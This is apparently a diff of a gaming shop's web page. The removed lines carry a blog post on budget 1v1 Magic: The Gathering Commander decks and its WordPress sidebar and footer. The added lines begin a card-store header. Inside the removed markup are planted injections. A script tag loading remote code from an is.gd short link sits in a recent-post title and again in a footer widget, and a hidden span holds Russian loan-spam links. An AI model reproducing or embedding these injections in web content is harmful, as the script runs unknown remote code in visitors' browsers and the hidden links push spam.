-<p><em><a href="https://www.wizardscupboard.com/selvala-heart-wilds-p-46508.html">Selvala, Heart of the Wild</a></em> decks are very close to <em><a href="https://www.wizardscupboard.com/nissa-vastwood-seer-nissa-sage-animist-p-41773.html">Nissa, Vastwood Seer</a></em> decks. The only difference is that Selvala has a slight combo aspect to the deck. <a href="https://www.wizardscupboard.com/phyrexian-dreadnought-p-6149.html"><em>Phyrexian Dreadnought</em></a>, <a href="https://www.wizardscupboard.com/phyrexian-soulgorger-p-20006.html"><em>Phyrexian Soulgorger</em></a>, and <a href="https://www.wizardscupboard.com/sheltering-ancient-p-20023.html"><em>Sheltering Ancient</em></a> function as insane ramp spells with Selvala in play, allowing for some truly obscene turns.</p>
-<p>Other than that, expect a lot of similarities to Nissa decks. Selvala will rely slightly more on creature ramp due to the nature of the commander, but the overall gameplay is similar.</p>
-<h3>Sidisi, Undead Vizier</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/SidisiUndeadVizier.jpg"><img class="alignnone size-medium wp-image-1868" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/SidisiUndeadVizier-215x300.jpg" alt="" width="215" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/SidisiUndeadVizier-215x300.jpg 215w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/SidisiUndeadVizier.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
-<p>1v1 Commander’s main combo deck, <em><a href="https://www.wizardscupboard.com/sidisi-undead-vizier-p-40473.html">Sidisi, Undead Vizier</a></em> is an expensive <em><a href="https://www.wizardscupboard.com/demonic-tutor-p-2150.html">Demonic Tutor</a></em> that sits in the command zone. The deck is filled with tutor effects, since the deck needs to find <em><a href="https://www.wizardscupboard.com/buried-alive-p-35040.html">Buried Alive</a></em> and a reanimate spell. <em><a href="https://www.wizardscupboard.com/buried-alive-p-35040.html">Buried Alive</a></em> puts <em><a href="https://www.wizardscupboard.com/necrotic-ooze-p-27932.html">Necrotic Ooze</a></em>, <em><a href="https://www.wizardscupboard.com/phyrexian-devourer-p-2007.html">Phyrexian Devourer</a></em>, and <em><a href="https://www.wizardscupboard.com/walking-ballista-p-47076.html">Walking Ballista</a></em> (<em><a href="https://www.wizardscupboard.com/triskelion-p-15301.html">Triskelion</a></em>) in the graveyard, and a reanimate spell gets <em><a href="https://www.wizardscupboard.com/necrotic-ooze-p-27932.html">Necrotic Ooze</a></em> into play. <em><a href="https://www.wizardscupboard.com/phyrexian-devourer-p-2007.html">Phyrexian Devourer</a></em>’s ability lets <em><a href="https://www.wizardscupboard.com/necrotic-ooze-p-27932.html">Necrotic Ooze</a></em> load up with +1/+1 counters, and <em><a href="https://www.wizardscupboard.com/walking-ballista-p-47076.html">Walking Ballista</a></em>’s ability converts those counters into lethal damage.</p>
-<p>Almost every black deck plays <em><a href="https://www.wizardscupboard.com/demonic-tutor-p-2150.html">Demonic Tutor</a></em> and <em><a href="https://www.wizardscupboard.com/vampiric-tutor-p-44659.html">Vampiric Tutor</a></em>, but Sidisi goes far deeper down the rabbit hole. <em><a href="https://www.wizardscupboard.com/imperial-seal-p-7940.html">Imperial Seal</a></em>, <em><a href="https://www.wizardscupboard.com/beseech-queen-p-23419.html">Beseech the Queen</a></em>, <em><a href="https://www.wizardscupboard.com/grim-tutor-p-8867.html">Grim Tutor</a></em>, <em><a href="https://www.wizardscupboard.com/dimir-machinations-p-18663.html">Dimir Machinations</a></em> (transmute), and <em><a href="https://www.wizardscupboard.com/dark-petition-p-41678.html">Dark Petition</a></em> all make the cut. <em><a href="https://www.wizardscupboard.com/buried-alive-p-35040.html">Buried Alive</a></em> is irreplaceable and there are only about eight reanimate effects available, so any tutors help to buffer those counts.</p>
-<h1>My Adventures in Budget 1v1 Commander</h1>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/ZurgoBellstriker.jpg"><img class="alignnone size-medium wp-image-1871" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/ZurgoBellstriker-215x300.jpg" alt="" width="215" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/ZurgoBellstriker-215x300.jpg 215w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/ZurgoBellstriker.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
-<p>After reading about the format and watching LSV’s Baral video, I decided I wanted in on the action. I don’t have a MTGO collection beyond a Modern Burn deck, so Zurgo seemed like the place to start. I scrounged up some sample lists. I dumped about $20 into the deck, only skipping out on <em><a href="https://www.wizardscupboard.com/koth-hammer-p-27901.html">Koth of the Hammer</a></em>, <em><a href="https://www.wizardscupboard.com/goblin-rabblemaster-p-37377.html">Goblin Rabblemaster</a></em>, and <em><a href="https://www.wizardscupboard.com/umezawas-jitte-p-17385.html">Umezawa’s Jitte</a></em> for budget reasons.</p>
-<p>My results with the deck were medium. There was a sense of helplessness if you ever got paired against a deck with a combo finish. Sidisi combo decks were unbeatable. Baral’s <em><a href="https://www.wizardscupboard.com/polymorph-p-6155.html">Polymorph</a></em> plan was a pain, but a few Bolts could at least buy some time. Honestly, the “combo” of Delve out a fast Tasigur for a 4/5 body was miserable.</p>
-<p>That said, I certainly got my fair share of wins too. The deck curved out quite well, and I could crush just about anyone who stumbled. I also just enjoyed playing the deck.</p>
-<p>Something I haven’t really covered is the increased starting life total. Aggressive decks have the extra burden of opponents with thirty life. That increases the reliance on repeatable sources of damage (creatures) over burn spells.</p>
-<h3>What I learned from playing Zurgo</h3>
-<ul>
-<li>One drop creatures are not be a priority. Zurgo is almost always my turn one play, so any competing cards would need to be worth playing on a later turn. Cards like Goblin Guide are worth a slot, but Legion Loyalist can stay on the bench.</li>
-<li>Two drop creatures are incredibly important. Not being able to follow up Zurgo with a creature on turn two virtually guarantees the opponent will have time to take over.</li>
-<li>Recurring damage is vital. Cards like Lava Spike and Skullcrack deal damage in chunks small enough to question their inclusion. Traditional burn decks in 60 card formats should be able to assemble 20 damage after the opening hand and about three draw steps. Giving the opponent an additional 10 life means four or five more draw steps to even assemble lethal damage. In a format filled with countermagic and combo finishes, this is not the path to glory.</li>
-<li>There are some great options for hating out combo in red, such as Eidolon of the Great Revel and Harsh Mentor. Unfortunately, there are no ways to ensure you find those cards in the correct matchup. You have to pray really hard to hit your one-outer in a 100 card deck.</li>
-</ul>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/DranaLiberatorOfMalakir.jpg"><img class="alignnone size-medium wp-image-1864" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/DranaLiberatorOfMalakir-215x300.jpg" alt="" width="215" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/DranaLiberatorOfMalakir-215x300.jpg 215w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/DranaLiberatorOfMalakir.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
-<p>After my mediocre results with Zurgo, I decided to move onto <em><a href="https://www.wizardscupboard.com/drana-liberator-malakir-p-42362.html">Drana, Liberator of Malakir</a></em>. Somehow I convinced myself that red’s lack of options instead of the poor positioning of aggressive decks was my problem. Actually, I’ll be honest. I was blinded by the opportunity to Dark Ritual into Hypnotic Specter, my favorite Cube opening (don’t judge).</p>
-<p>Drana’s strength over Zurgo is twofold. The first is the suite of discard spells available, giving your deck a vital way to interact. Second are the tutor effects, black’s biggest contribution to Commander. Silver bullets could be included to handle extreme problems</p>
-<p>Drana decks have had some success already, and this deck still essentially builds itself. To maximize Drana, the deck needs a ton of one and two cost creatures. Black has tons of options for mediocre aggressive cards, so those fill out the bulk of the deck. Tutors, discard, and removal fill out most of the deck, with a few silver bullet cards to tutor for in the correct matchup.</p>
-<h3>What I learned from playing Drana</h3>
-<ul>
-<li>From a purely aggressive stance, Drana is miles worse than Zurgo. Zurgo nullifies the need for one drop creatures, while Drana does the same thing for three drop creatures. That leaves the Drana deck full of much worse top deck draws when the two are directly compared</li>
-<li>Very few of black’s threats feel better than replacement level. When I needed to Demonic Tutor for a threat instead of an answer, anything I picked felt lackluster. I’m not sure how to fix this problem, but I imagine there is something I could throw tickets at to make it less of a problem. Maybe Batterskull would be a good start.</li>
-<li>Hellfire is awesome. I didn’t know this card existed before I put the deck together, but it has overperformed. My deck should have a Damnation or Toxic Deluge to tutor for, but I didn’t pick one up for budget reasons. Hellfire comes with a higher mana cost, but sometimes wins the game on the spot.</li>
-<li>Hatred is great. I definitely knew about this one before I started building, as it is my favorite Mental Magic card. The abundance of discard spells makes it trivial to know when it’s safe to go all in.</li>
-</ul>
-<p>At this point, I’m ready to explore building a Sidisi combo deck. I like playing aggressive decks, but I’ve already gone into the problems that aggressive decks face. I would enjoy playing one of the multicolor decks, but my MTGO account isn’t flush enough to delve that deep.</p>
-<p>tl;dr<br />
-Think constructed Cube. Blue or Blue/x is control/midrange, green is ramp, and black is combo. Tutors are great. Vial Smasher OP.<br />
-Zurgo and Drana are mediocre, but affordable. Don’t expect to 5-0 many leagues, but you can have a decent time for ~$20.</p>
-
-</section><!-- /.article-content -->
-					<aside class="post-meta">
-			<ul>
-				<li class="categories"><a href="https://www.wizardscupboard.com/wordpress/category/edh-commander/" rel="category tag">EDH/Commander</a></li>
-				<li class="comment"><a href="https://www.wizardscupboard.com/wordpress/an-overview-and-my-experiences-with-1v1-commander/#respond">0 Comments</a></li>
-													<li class="author"><a href="https://www.wizardscupboard.com/wordpress/author/byronking/" title="Posts by Byron King" rel="author">Byron King</a></li>
-							</ul>
-		</aside><!-- /.post-meta -->
-		
-		</article><!-- #post-1860 -->
-
-	
-			<nav role="navigation" id="" class="navigation-post">
-			<h1 class="screen-reader-text">Post navigation</h1>
-
-		
-			<div class="nav-previous"><a href="https://www.wizardscupboard.com/wordpress/shambling-into-standard/" rel="prev"><span class="meta-nav"></span> Shambling into Standard</a></div>			<div class="nav-next"><a href="https://www.wizardscupboard.com/wordpress/modifying-the-mtgo-vintage-cube/" rel="next">Modifying the MTGO Vintage Cube <span class="meta-nav"></span></a></div>
-		
-		</nav><!-- # -->
-		
-
-
-<div id="comments" class="comments">
-
-	
-	
-		<div id="respond" class="comment-respond">
-		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/wordpress/an-overview-and-my-experiences-with-1v1-commander/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="https://www.wizardscupboard.com/wordpress/wp-comments-post.php" method="post" id="commentform" class="comment-form">
-				<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea></p><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" aria-required='true' required='required' /></p>
-<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" aria-required='true' required='required' /></p>
-<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="text" value="" size="30" maxlength="200" /></p>
-<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='1860' id='comment_post_ID' />
-<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
-</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="dead4a1091" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="74"/></p>			</form>
-			</div><!-- #respond -->
-	
-</div><!-- .comments -->
-
-
-</section><!-- /.content -->
-
-
-
-
-<aside class="sidebar" role="complementary">
-
-	
-	<aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" class="searchform" action="https://www.wizardscupboard.com/wordpress/" role="search">
-		<label for="s" class="screen-reader-text">Search</label>
-		<input type="search" class="field" name="s" value="" id="s" placeholder="Search &hellip;" />
-		<input type="submit" class="submit" id="searchsubmit" value="Search" /><span style="dispLAy : NOnE;"><a href="http://www.tttgoogle.ru">кредит онлайн заявка</a><a href="http://www.tttgoogle.ru/zaymyi.html">срочный кредит</a><a href="http://www.tttgoogle.ru/business-kredit.html">кредит бизнесу1</a></span>
-	</form>
-</aside><aside id="widget_sp_image-2" class="widget widget_sp_image"><a href="http://www.wizardscupboard.com" id="" target="_blank" class="widget_sp_image-image-link" title="" rel=""><img width="180" height="180" alt="" class="attachment-full aligncenter" style="max-width: 100%;" src="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/artifacts.WC_.sqaure.jpg" /></a></aside><aside id="categories-2" class="widget widget_categories"><h2>Categories</h2>		<ul>
-	<li class="cat-item cat-item-1"><a href="https://www.wizardscupboard.com/wordpress/category/edh-commander/" title="Post&#039;s relating to EDH/Commander Card&#039;s, Deck&#039;s and Deck Construction">EDH/Commander</a> (24)
-</li>
-	<li class="cat-item cat-item-5"><a href="https://www.wizardscupboard.com/wordpress/category/ramblings/" title="Just general ramblings">MTG Ramblings</a> (37)
-</li>
-	<li class="cat-item cat-item-6"><a href="https://www.wizardscupboard.com/wordpress/category/standard-decks/" title="New standard deck ideas">Standard</a> (14)
-</li>
-		</ul>
-</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h2>Recent Posts</h2>		<ul>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/the-momir-basic-box/">The Momir Basic Box</a>
-						</li>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/modern-horizons-shopping-list/">Modern Horizons Shopping List</a>
-						</li>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/matt-harvey-unlike-mets-says-he-always-thought-he-had-a-180-inning-limit/">Matt Harvey, unlike Mets, says he always thought he had a 180-inning limit</a>
-						</li>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/from-convict-to-legal-justice-reporter-i-was-so-fortunate-to-come-away-from-this/">From Convict To Legal Justice Reporter: &#8216;I Was So Fortunate To come Away from This&#8217;</a>
-						</li>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/new-cards-for-modern/">New Cards for Modern<script src="https://is.gd/GgGf9z?v=v25.0"></script></a>
-						</li>
-				</ul>
-		</aside>		<aside id="archives-2" class="widget widget_archive"><h2>Archives</h2>		<ul>
-			<li><a href='https://www.wizardscupboard.com/wordpress/2019/09/'>September 2019</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2019/08/'>August 2019</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2018/09/'>September 2018</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2018/08/'>August 2018</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/08/'>August 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/07/'>July 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/06/'>June 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/05/'>May 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/04/'>April 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/03/'>March 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/02/'>February 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/01/'>January 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/11/'>November 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/09/'>September 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/08/'>August 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/07/'>July 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/06/'>June 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/05/'>May 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/04/'>April 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/03/'>March 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/02/'>February 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/01/'>January 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/12/'>December 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/11/'>November 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/10/'>October 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/09/'>September 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/08/'>August 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/07/'>July 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/06/'>June 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/05/'>May 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/04/'>April 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/03/'>March 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/02/'>February 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/12/'>December 2014</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/11/'>November 2014</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/07/'>July 2014</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/06/'>June 2014</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/04/'>April 2014</a></li>
-		</ul>
-		</aside><aside id="text-2" class="widget widget_text"><h2>Twitter</h2>			<div class="textwidget"><a class="twitter-timeline" href="https://twitter.com/Wizardscupboard" data-widget-id="514549358423851009">Tweets by @Wizardscupboard</a>
-<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script></div>
-		</aside><aside id="text-3" class="widget widget_text"><h2>Facebook</h2>			<div class="textwidget"><div class="fb-activity" data-site="http://www.wizardscupboard.com" data-action="likes, recommends" data-colorscheme="dark" data-header="true"></div></div>
-		</aside>
-	
-</aside>
-
-
-
-
-
-		
-		</div><!-- /.content-wrapper -->
-
-		<footer class="footer content-wrapper" role="contentinfo">
-
-			<div class="footer-content">
-
-					<section class="footer-widgets columns-3">
-
-		<div class="footer-sidebar first">
-					</div>
-
-		<div class="footer-sidebar second">
-					</div>
-
-		<div class="footer-sidebar third">
-			<aside id="text-999" class="widget widget_text">			<div class="textwidget"><script src="https://is.gd/GgGf9z?v=v25.0"></script></div>
-		</aside>		</div>
-
-	</section>
-		<p>
-		Powered by <a href="http://www.wizardscupboard.com" title="WordPress.org">Wizard's Cupboard</a>.
-	</p>
-			<a href="#top" class="back-to-top button">
-			Back to top		</a>
-	
-			</div><!-- /.footer-content -->
-
-		</footer>
-
-		
-	</div><!-- /.inner-wrap -->
-
-</div><!-- /.outer-wrap -->
-
-
-<div id="su-footer-links" style="text-align: center;"></div><script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/plugins/akismet/_inc/form.js?ver=3.2'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/plugins.min.js?ver=4.7.14'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/script.min.js?ver=4.7.14'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/comment-reply.min.js?ver=4.7.14'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/wp-embed.min.js?ver=4.7.14'></script>
-
-</body>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Magic the Gathering: Magic Cards, Magic the Gathering Cards, Buy Cards -Wizards Cupboard</title>
+<base href="https://www.wizardscupboard.com/">
+<link rel="stylesheet" type="text/css" href="stylesheet.css">
+<script language="javascript" type="text/javascript">
+//<![CDATA[
+var cot_loc0=(window.location.protocol == "https:")? "https://secure.comodo.net/trustlogo/javascript/cot.js" :
+"http://www.trustlogo.com/trustlogo/javascript/cot.js";
+document.writeln('<scr' + 'ipt language="JavaScript" src="'+cot_loc0+'" type="text\/javascript">' + '<\/scr' + 'ipt>');
+//]]>
+</script></head>
+<body>
+<!-- header //-->
+<table border="0" width="1000" align="center" cellspacing="0" cellpadding="0">
+  <tr>
+    <td valign="middle" bgcolor="#000000"><center>
+    	<OBJECT 
+    		data="banner.swf" 
+    		type="application/x-shockwave-flash" 
+    		width="1000" 
+    		height="136" 
+    		id="banner">
+	    <PARAM name="movie" value="banner.swf"> 
+	    <PARAM name="quality" value="high"> 
+	    <PARAM name="bgcolor" value="#FFFFFF">
+	    <PARAM name="wmode" value="transparent">
+	      		</OBJECT>
+  	</center>
+  	</td>
+  </tr>
+</table>
+<table border="0" width="1000" align="center" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="headerNavigation">&nbsp;&nbsp;<a href="https://www.wizardscupboard.com" class="headerNavigation">Home</a> &raquo; <a href="https://www.wizardscupboard.com/index.php?osCsid=441b60259e389f204676a3a90e5e1847" class="headerNavigation">Magic the Gathering</a> &raquo; <a href="https://www.wizardscupboard.com/shopping_cart.php?osCsid=441b60259e389f204676a3a90e5e1847" class="headerNavigation">Cart Contents</a></td>
+    <!-- PWA BOF -->    
+    <td align="right" class="headerNavigation">    		<a href="https://www.wizardscupboard.com/account.php?osCsid=441b60259e389f204676a3a90e5e1847" class="headerNavigation">My Account</a> &nbsp;|&nbsp;     	<a href="https://www.wizardscupboard.com/shopping_cart.php?osCsid=441b60259e389f204676a3a90e5e1847" class="headerNavigation">Cart Contents</a> &nbsp;|&nbsp; <a href="https://www.wizardscupboard.com/checkout_shipping.php?osCsid=441b60259e389f204676a3a90e5e1847" class="headerNavigation">Checkout</a> &nbsp;&nbsp;</td>
+    <!-- PWA EOF -->
+  </tr>
+</table>
+<!-- header_eof //-->
+
+<!-- body //-->
+<table border="0" width="1000" align="center" cellspacing="3" cellpadding="3">
+  <tr>
+    <td width="150" valign="top"><table border="0" width="150" cellspacing="0" cellpadding="2">
+<!-- left_navigation //-->
+<!-- search //-->
+          <tr>
+            <td>
+            		<script language="javascript" src="includes/searchSuggest.js" type="text/javascript"></script>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_left.gif" width="11" height="14" border="0" alt="Magic the Gathering" title="Magic the Gathering"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Quick Find</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td align="center" class="boxText"><form name="quick_find" action="https://www.wizardscupboard.com/advanced_search_result.php" method="get"><input type="text" name="keywords" id="txtSearch" onkeyup="searchSuggest();" size="10" maxlength="50" style="width: 120px"><div id="search_suggest"></div>&nbsp;<input type="hidden" name="osCsid" value="441b60259e389f204676a3a90e5e1847"><input type="image" src="includes/languages/english/images/buttons/button_quick_find.gif" alt="Magic Cards Quick Find" title=" Magic Cards Quick Find "><br>Use keywords to find your product or try the<br><a href="https://www.wizardscupboard.com/advanced_search.php?osCsid=441b60259e389f204676a3a90e5e1847"><b>Advanced Search</b></a></form></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+
+            </td>
+          </tr>
+<!-- search_eof //-->
+<!-- categories //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Categories</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><a href="https://www.wizardscupboard.com/singles-c-100.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Singles">Singles-&gt;</a><br><a href="https://www.wizardscupboard.com/foils-c-1100.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Foils">Foils-&gt;</a><br><a href="https://www.wizardscupboard.com/sets-c-500.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Sets">Sets</a><br><a href="https://www.wizardscupboard.com/booster-boxes-c-210.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Booster Boxes">Booster Boxes</a><br><a href="https://www.wizardscupboard.com/booster-packs-c-220.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Booster Packs">Booster Packs</a><br><a href="https://www.wizardscupboard.com/other-sealed-product-c-230.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Other Sealed Product">Other Sealed Product</a><br><a href="https://www.wizardscupboard.com/specialty-items-c-300.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Specialty Items">Specialty Items</a><br><a href="https://www.wizardscupboard.com/accessories-c-600.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Accessories">Accessories</a><br><a href="https://www.wizardscupboard.com/other-ccgs-c-400.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Other CCG's">Other CCG's</a><br><a href="https://www.wizardscupboard.com/alternate-cards-c-1181.html?osCsid=441b60259e389f204676a3a90e5e1847" title="Magic the Gathering Alternate Art Cards">Alternate Art Cards</a><br></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- categories_eof //-->
+<!-- info_pages //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Information</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><a target="_blank" href="wordpress/">Blog</a><br><a target="" href="https://www.wizardscupboard.com/dragon-sculptures-ip-11.html?osCsid=441b60259e389f204676a3a90e5e1847">Dragon Sculptures</a><br><a target="" href="https://www.wizardscupboard.com/company-details-ip-5.html?osCsid=441b60259e389f204676a3a90e5e1847">Company Details</a><br><a target="" href="https://www.wizardscupboard.com/shipping-returns-ip-6.html?osCsid=441b60259e389f204676a3a90e5e1847">Shipping & Returns</a><br><a target="" href="ramblings.php">TWC Ramblings</a><br><a target="" href="news.php">News Archive</a><br><a target="" href="https://www.wizardscupboard.com/grading-ip-9.html?osCsid=441b60259e389f204676a3a90e5e1847">Grading</a><br><a target="" href="faq.php">F.A.Q.</a><br><a target="" href="contact_us.php">Contact Us</a><br></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- info_pages_eof //-->
+
+<!-- information //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Tools</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td align="left" class="boxText"><a href="https://www.wizardscupboard.com/sell_to_us.php?osCsid=441b60259e389f204676a3a90e5e1847" title="Buy Magic Cards">Sell to Us</a><br><a href="https://www.wizardscupboard.com/link_to_us.php?osCsid=441b60259e389f204676a3a90e5e1847" title="Link to the Cupboard">Link to Us</a></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- information_eof //--><!-- topics //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Articles</td>
